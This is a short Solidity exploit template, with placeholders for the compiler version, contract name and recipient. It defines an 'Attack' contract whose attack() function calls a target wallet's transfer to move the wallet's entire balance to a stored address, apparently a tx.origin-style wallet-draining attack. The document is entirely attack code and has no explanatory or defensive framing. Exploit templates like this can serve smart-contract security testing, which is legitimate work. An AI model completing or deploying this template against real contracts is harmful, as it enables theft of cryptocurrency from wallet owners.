// SPDX-License-Identifier: MIT
*Version*
contract Attack {
    address payable public *Victim*;
    *ContractName* victim_wallet;

    constructor (*ContractName* _wallet) public {
        victim_wallet = *ContractName*(_wallet);
        *Victim* = msg.sender;
    }
    function attack() public {
        victim_wallet.transfer(*Victim*, address(victim_wallet).balance);
	}
}